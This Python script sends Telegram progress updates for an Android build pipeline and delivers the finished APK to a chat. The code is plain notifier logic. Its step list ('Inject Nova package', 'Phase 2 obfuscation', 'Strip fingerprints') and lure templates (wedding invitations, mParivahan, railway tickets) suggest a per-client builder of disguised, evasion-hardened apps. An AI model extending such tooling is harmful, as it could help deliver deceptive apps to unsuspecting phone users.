#!/usr/bin/env python3
"""
telegram_notify.py
─────────────────────────────────────────────────────────────────────────────
Called by build.yml at every step.
Edits a single Telegram message in-place (message mutation).
On success: edits message to success state + sends APK file.
On failure: edits message to failed state.

Usage:
  python3 scripts/telegram_notify.py \
    --step     "Build release APK" \
    --status   "progress" \
    --build    "271" \
    --template "wedding" \
    --client   "1" \
    --chat-id  "8852912150" \
    --msg-id   "12345" \
    --token    "BOT_TOKEN"

  # Final success step with APK:
  python3 scripts/telegram_notify.py \
    --step     "Send to Telegram" \
    --status   "success" \
    --build    "271" \
    --template "wedding" \
    --client   "1" \
    --chat-id  "8852912150" \
    --msg-id   "12345" \
    --token    "BOT_TOKEN" \
    --apk      "app/build/outputs/apk/release/nova_abc123.apk" \
    --apk-size "2.7 MB" \
    --pkg      "com.shaadicard.invitemaker"
"""

import argparse
import json
import os
import sys
import time
import urllib.request
import urllib.parse
from datetime import datetime, timezone

# ── Build step order — used to render progress list ──────────────────────────
BUILD_STEPS = [
    "Checkout",
    "Install tools",
    "Generate package name",
    "Inject Nova package",
    "Build companion APK",
    "Build release APK",
    "Phase 2 obfuscation",
    "Re-sign APK",
    "Strip fingerprints",
    "Integrity check",
    "Send to Telegram",
]

# ── Template display names + emoji ───────────────────────────────────────────
TEMPLATE_MAP = {
    "wedding":    ("💍", "Wedding Invitation"),
    "shaadi":     ("💒", "Shaadi Ka Nimantran"),
    "mparivahan": ("🚗", "mParivahan"),
    "railway":    ("🚂", "Indian Railway Ticket"),
    "custom":     ("⚙️",  "Custom"),
}

# ── Average step durations in seconds (for ETA calculation) ──────────────────
STEP_DURATIONS = {
    "Checkout":             5,
    "Install tools":        30,
    "Generate package name": 5,
    "Inject Nova package":  5,
    "Build companion APK":  45,
    "Build release APK":    60,
    "Phase 2 obfuscation":  20,
    "Re-sign APK":          10,
    "Strip fingerprints":   10,
    "Integrity check":      5,
    "Send to Telegram":     5,
}
TOTAL_ESTIMATED = sum(STEP_DURATIONS.values())


def telegram_request(token: str, method: str, data: dict,
                     files: dict = None, retries: int = 3) -> dict:
    """Make Telegram API request with retry."""
    url = f"https://api.telegram.org/bot{token}/{method}"

    for attempt in range(retries):
        try:
            if files:
                # multipart/form-data for file upload
                import mimetypes
                boundary = "----TelegramBoundary"
                body_parts = []

                for key, value in data.items():
                    body_parts.append(
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
                        f"{value}\r\n"
                    )

                for key, (filename, file_data, mime) in files.items():
                    body_parts.append(
                        f"--{boundary}\r\n"
                        f'Content-Disposition: form-data; name="{key}"; '
                        f'filename="{filename}"\r\n'
                        f"Content-Type: {mime}\r\n\r\n"
                    )

                body = "".join(body_parts).encode("utf-8")
                for key, (filename, file_data, mime) in files.items():
                    body += file_data + f"\r\n--{boundary}--\r\n".encode()

                req = urllib.request.Request(
                    url, data=body,
                    headers={"Content-Type":
                             f"multipart/form-data; boundary={boundary}"}
                )
            else:
                payload = json.dumps(data).encode("utf-8")
                req = urllib.request.Request(
                    url, data=payload,
                    headers={"Content-Type": "application/json"}
                )

            with urllib.request.urlopen(req, timeout=15) as resp:
                return json.loads(resp.read().decode("utf-8"))

        except Exception as e:
            print(f"[telegram_notify] Attempt {attempt + 1}/{retries} failed: {e}",
                  file=sys.stderr)
            if attempt < retries - 1:
                time.sleep(3)

    print(f"[telegram_notify] All {retries} attempts failed for {method}",
          file=sys.stderr)
    return {}


def send_message(token: str, chat_id: str, text: str) -> str:
    """Send new message. Returns message_id as string."""
    result = telegram_request(token, "sendMessage", {
        "chat_id":    chat_id,
        "text":       text,
        "parse_mode": "HTML",
    })
    msg = result.get("result", {})
    return str(msg.get("message_id", ""))


def edit_message(token: str, chat_id: str, message_id: str, text: str):
    """Edit existing message in-place (message mutation)."""
    if not message_id or message_id == "0":
        return
    telegram_request(token, "editMessageText", {
        "chat_id":    chat_id,
        "message_id": message_id,
        "text":       text,
        "parse_mode": "HTML",
    })


def send_document(token: str, chat_id: str, apk_path: str,
                  caption: str) -> bool:
    """Send APK file as Telegram document."""
    if not os.path.exists(apk_path):
        print(f"[telegram_notify] APK not found: {apk_path}", file=sys.stderr)
        return False

    filename = os.path.basename(apk_path)
    with open(apk_path, "rb") as f:
        file_data = f.read()

    result = telegram_request(
        token, "sendDocument",
        {
            "chat_id":    chat_id,
            "caption":    caption,
            "parse_mode": "HTML",
        },
        files={
            "document": (filename, file_data, "application/vnd.android.package-archive")
        }
    )
    return bool(result.get("ok"))


def format_elapsed(seconds: int) -> str:
    """Format seconds as Xm Ys."""
    m = seconds // 60
    s = seconds % 60
    if m > 0:
        return f"{m}m {s:02d}s"
    return f"{s}s"


def calc_eta(current_step: str, elapsed: int) -> str:
    """Calculate remaining ETA based on current step."""
    found = False
    remaining = 0
    for step in BUILD_STEPS:
        if step == current_step:
            found = True
            remaining += STEP_DURATIONS.get(step, 10)
            continue
        if found:
            remaining += STEP_DURATIONS.get(step, 10)
    if remaining <= 0:
        return "~0s"
    return f"~{format_elapsed(remaining)}"


def build_progress_message(current_step: str, status: str,
                           build_num: str, template: str,
                           client: str, elapsed: int,
                           pkg: str = "", apk_size: str = "") -> str:
    """Build the progress message text."""

    emoji, display_name = TEMPLATE_MAP.get(template, ("⚙️", template.title()))
    now_utc = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    if status == "success":
        lines = [
            f"✅ <b>Build #{build_num} — SUCCESS</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"Client   : {client}",
            f"Template : {emoji} {display_name}",
            "━━━━━━━━━━━━━━━━━━━━",
            f"📦 Package  : <code>{pkg}</code>",
            f"📁 Size     : {apk_size}",
            f"⏱ Duration : {format_elapsed(elapsed)}",
            f"🕐 UTC      : {now_utc}",
            "━━━━━━━━━━━━━━━━━━━━",
            "APK file sent below ⬇️",
        ]
        return "\n".join(lines)

    if status == "failure":
        lines = [
            f"❌ <b>Build #{build_num} — FAILED</b>",
            "━━━━━━━━━━━━━━━━━━━━",
            f"Client   : {client}",
            f"Template : {emoji} {display_name}",
            "━━━━━━━━━━━━━━━━━━━━",
            f"⚠️ Failed at : <b>{current_step}</b>",
            f"⏱ Elapsed   : {format_elapsed(elapsed)}",
            f"🕐 UTC       : {now_utc}",
            "━━━━━━━━━━━━━━━━━━━━",
            "Check GitHub Actions for full log.",
        ]
        return "\n".join(lines)

    # progress
    step_lines = []
    current_found = False
    for step in BUILD_STEPS:
        if step == current_step:
            step_lines.append(f"⏳ {step}...")
            current_found = True
        elif not current_found:
            step_lines.append(f"✅ {step}")
        else:
            step_lines.append(f"⬜ {step}")

    eta = calc_eta(current_step, elapsed)

    lines = [
        f"🔨 <b>Building: {emoji} {display_name}</b>",
        "━━━━━━━━━━━━━━━━━━━━",
        f"Client  : {client}",
        f"Build   : #{build_num}",
        "━━━━━━━━━━━━━━━━━━━━",
    ] + step_lines + [
        "━━━━━━━━━━━━━━━━━━━━",
        f"⏱ Elapsed : {format_elapsed(elapsed)}",
        f"📊 ETA     : {eta}",
    ]
    return "\n".join(lines)


def resolve_token(token_arg: str) -> str:
    """
    Triple fallback token resolution.
    Priority 1: --token argument (from GitHub Secret via build.yml)
    Priority 2: TELEGRAM_BOT_TOKEN environment variable
    Priority 3: BOT_TOKEN environment variable
    Returns empty string if all fail.
    """
    PLACEHOLDER = "YOUR_BOT_TOKEN_HERE"

    # Priority 1: argument
    if token_arg and token_arg != PLACEHOLDER and ":" in token_arg:
        return token_arg

    # Priority 2: TELEGRAM_BOT_TOKEN env var
    env_token = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    if env_token and env_token != PLACEHOLDER and ":" in env_token:
        print(f"[telegram_notify] Token resolved via "
              f"TELEGRAM_BOT_TOKEN env var")
        return env_token

    # Priority 3: BOT_TOKEN env var
    env_token2 = os.environ.get("BOT_TOKEN", "")
    if env_token2 and env_token2 != PLACEHOLDER and ":" in env_token2:
        print(f"[telegram_notify] Token resolved via BOT_TOKEN env var")
        return env_token2

    return ""


def resolve_chat_id(chat_id_arg: str) -> str:
    """
    Triple fallback chat_id resolution.
    Priority 1: --chat-id argument
    Priority 2: TELEGRAM_CHAT_ID environment variable
    Priority 3: BUILD_CHAT_ID environment variable
    """
    # Priority 1: argument
    if chat_id_arg and chat_id_arg not in ("0", "", "YOUR_CHAT_ID_HERE"):
        return chat_id_arg

    # Priority 2: TELEGRAM_CHAT_ID env var
    env_chat = os.environ.get("TELEGRAM_CHAT_ID", "")
    if env_chat and env_chat not in ("0", ""):
        print(f"[telegram_notify] Chat ID resolved via "
              f"TELEGRAM_CHAT_ID env var")
        return env_chat

    # Priority 3: BUILD_CHAT_ID env var
    env_chat2 = os.environ.get("BUILD_CHAT_ID", "")
    if env_chat2 and env_chat2 not in ("0", ""):
        print(f"[telegram_notify] Chat ID resolved via "
              f"BUILD_CHAT_ID env var")
        return env_chat2

    return ""


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--step",      required=True)
    parser.add_argument("--status",    required=True,
                        choices=["progress", "success", "failure"])
    parser.add_argument("--build",     required=True)
    parser.add_argument("--template",  required=True)
    parser.add_argument("--client",    required=True)
    parser.add_argument("--chat-id",   required=True, dest="chat_id")
    parser.add_argument("--msg-id",    required=True, dest="msg_id")
    parser.add_argument("--token",     required=True)
    parser.add_argument("--apk",       default="")
    parser.add_argument("--apk-size",  default="", dest="apk_size")
    parser.add_argument("--pkg",       default="")
    parser.add_argument("--elapsed",   default="0", type=int)
    args = parser.parse_args()

    # ── Triple fallback token + chat_id resolution ────────────
    resolved_token   = resolve_token(args.token)
    resolved_chat_id = resolve_chat_id(args.chat_id)

    # Skip silently only if all 3 fallbacks fail
    if not resolved_token or not resolved_chat_id:
        print("[telegram_notify] No chat_id or token — skipping notification")
        sys.exit(0)

    # Use resolved values
    args.token   = resolved_token
    args.chat_id = resolved_chat_id

    # Calculate elapsed from CI start time env var if available
    elapsed = args.elapsed
    start_ts = os.environ.get("BUILD_START_TS", "")
    if start_ts:
        try:
            elapsed = int(time.time()) - int(start_ts)
        except Exception:
            pass

    text = build_progress_message(
        current_step=args.step,
        status=args.status,
        build_num=args.build,
        template=args.template,
        client=args.client,
        elapsed=elapsed,
        pkg=args.pkg,
        apk_size=args.apk_size,
    )

    # Edit existing message (message mutation)
    if args.msg_id and args.msg_id != "0":
        edit_message(args.token, args.chat_id, args.msg_id, text)
    else:
        # First call — no message_id yet, just print text
        # (bot creates message and passes msg_id in workflow inputs)
        print(f"[telegram_notify] No msg_id — message not edited")

    # On success: send APK file as separate message
    if args.status == "success" and args.apk:
        emoji, display_name = TEMPLATE_MAP.get(
            args.template, ("⚙️", args.template.title()))
        caption = (
            f"📦 <b>Build #{args.build} — {emoji} {display_name}</b>\n"
            f"Package: <code>{args.pkg}</code>\n"
            f"Size: {args.apk_size}"
        )
        ok = send_document(args.token, args.chat_id, args.apk, caption)
        if ok:
            print(f"[telegram_notify] APK sent successfully")
        else:
            print(f"[telegram_notify] APK send failed", file=sys.stderr)
            sys.exit(1)

    print(f"[telegram_notify] Done — step={args.step} status={args.status}")


if __name__ == "__main__":
    main()
